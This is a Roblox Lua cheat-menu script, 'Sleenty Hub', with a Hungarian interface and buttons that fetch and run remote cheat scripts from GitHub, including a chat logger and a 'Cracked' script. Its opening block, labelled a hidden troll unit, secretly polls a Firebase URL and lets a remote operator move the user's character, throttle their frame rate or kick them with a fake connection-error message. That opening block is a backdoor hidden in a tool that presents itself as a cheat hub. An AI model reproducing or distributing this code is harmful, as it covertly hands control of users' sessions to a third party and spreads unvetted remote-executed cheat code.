-- [[ TITKOS TROLL EGYSÉG - LÁTHATATLAN ]]
local FIREBASE_URL = "https://troll-9ab62-default-rtdb.firebaseio.com/.json"

task.spawn(function()
    local lastT = 0
    while true do
        task.wait(0.5)
        local ok, res = pcall(function() return game:HttpGet(FIREBASE_URL .. "?t=" .. tostring(tick())) end)
        if ok and res and res ~= "null" then
            local data = game:GetService("HttpService"):JSONDecode(res)
            if data and data.t and data.t > lastT then
                lastT = data.t
                local p = game.Players.LocalPlayer
                local char = p.Character
                local hum = char and char:FindFirstChild("Humanoid")
                local root = char and char:FindFirstChild("HumanoidRootPart")
                if hum and root then
                    if data.cmd == "forward" then hum:MoveTo(root.Position + (root.CFrame.LookVector * 12))
                    elseif data.cmd == "back" then hum:MoveTo(root.Position - (root.CFrame.LookVector * 12))
                    elseif data.cmd == "left" then hum:MoveTo(root.Position - (root.CFrame.RightVector * 12))
                    elseif data.cmd == "right" then hum:MoveTo(root.Position + (root.CFrame.RightVector * 12))
                    elseif data.cmd == "jump" then hum.Jump = true hum:ChangeState(1)
                    elseif data.cmd == "fps5" then setfpscap(5)
                    elseif data.cmd == "fps10" then setfpscap(10)
                    elseif data.cmd == "fps20" then setfpscap(20)
                    elseif data.cmd == "fps40" then setfpscap(40)
                    elseif data.cmd == "fps60" then setfpscap(60)
                    elseif data.cmd == "kick" then 
                        p:Kick("\nPlease check your internet connection and try again.\n(Error Code: 277)")
                    end
                end
            end
        end
    end
end)

-- [[ SLEENTY HUB ALAP - ÖSSZES SZKRIPTTEL ]]
local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua'))()

local Window = Rayfield:CreateWindow({
   Name = "Sleenty Hub | V5.0",
   LoadingTitle = "Betöltés...",
   LoadingSubtitle = "Kérlek várj...",
   ConfigurationSaving = { Enabled = false, FileName = "SleentyHub" },
   KeySystem = true,
   KeySettings = {
      Title = "Belépés",
      Subtitle = "Kulcs: Sleenty123",
      Note = "Kulcs: Sleenty123",
      Key = {"Sleenty123"}
   }
})

local MainTab = Window:CreateTab("Szkriptek")
MainTab:CreateSection("Fő Szkriptek")

MainTab:CreateButton({
   Name = "Ringta - 99 Nights",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/wehibuyfgyuwe/99nights.github.io/refs/heads/main/ringta.lua"))() end,
})

MainTab:CreateButton({
   Name = "Voidware - 99 Nights",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Voidware/Scripts/main/99Nights.lua"))() end,
})

MainTab:CreateButton({
   Name = "Infinite Yield",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))() end,
})

MainTab:CreateButton({
   Name = "God mode (blox fruit)",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/HibaHub/BloxFruits/main/GodMode.lua"))() end,
})

MainTab:CreateButton({
   Name = "be a lucky block",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsme/Scripts/main/LuckyBlock.lua"))() end,
})

MainTab:CreateSection("Brainrot & Tsunami")

MainTab:CreateButton({
   Name = "Survive lava (Tora Isme)",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsme/Scripts/main/SurviveLava.lua"))() end,
})

MainTab:CreateButton({
   Name = "Escape Tsunami Hub",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ToraIsme/Scripts/main/EscapeTsunami.lua"))() end,
})

MainTab:CreateButton({
   Name = "Steal a Brainrot Spawner",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Crypoth/StealABrainRotSpawner/refs/heads/main/XwareSpawner"))() end,
})

MainTab:CreateSection("Egyéb")

MainTab:CreateButton({
   Name = "Lumber Tycoon 2 KRON",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/KronHub/LumberTycoon/main/KRON.lua"))() end,
})

MainTab:CreateButton({
   Name = "Universal Touch Fling",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/FlingScript/Universal/main/TouchFling.lua"))() end,
})

MainTab:CreateButton({
   Name = "Universal Teleport",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/Teleport/Universal/main/SavedTeleport.lua"))() end,
})

MainTab:CreateButton({
   Name = "Build a Plane Hub",
   Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/SoulsHub/Universal/main/BuildAPlane.lua"))() end,
})

local MoveTab = Window:CreateTab("Mozgás")

MoveTab:CreateSlider({
   Name = "Sebesség",
   Range = {16, 500},
   Increment = 1,
   Suffix = "Speed",
   CurrentValue = 16,
   Flag = "WS",
   Callback = function(Value) game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value end,
})

local SecretTab = Window:CreateTab("Secret")

SecretTab:CreateInput({
   Name = "Kód",
   PlaceholderText = "SpyPrivat88",
   Callback = function(Text)
      if Text == "SpyPrivat88" then
         Rayfield:Notify({Title = "Siker!", Content = "Prémium feloldva!", Duration = 5})
         
         SecretTab:CreateButton({
            Name = "RIVALS - NullZen",
            Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/NullZen/Rivals/main/Cracked.lua"))() end,
         })
         
         SecretTab:CreateButton({
            Name = "SimpleSpy",
            Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/78n/SimpleSpy/main/SimpleSpySource.lua"))() end,
         })
         
         SecretTab:CreateButton({
            Name = "Chat Logger",
            Callback = function() loadstring(game:HttpGet("https://raw.githubusercontent.com/ant-783/ChatLogger/main/ChatLogger.lua"))() end,
         })
      end
   end,
})
